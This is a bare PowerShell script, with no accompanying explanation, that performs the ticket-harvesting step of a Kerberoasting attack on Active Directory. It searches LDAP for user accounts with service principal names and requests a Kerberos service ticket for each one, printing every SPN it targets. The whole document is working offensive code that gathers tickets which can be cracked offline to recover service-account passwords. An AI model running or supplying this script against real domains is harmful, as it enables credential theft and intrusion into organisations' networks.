$searcher = [adsisearcher]"(&(servicePrincipalName=*)(samAccountType=805306368))"
$targets = $searcher.FindAll()

foreach ($target in $targets) {
    $spn = $target.Properties.serviceprincipalname[0]
    Write-Host "[+] Requesting: $spn"
    $tmp = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
}
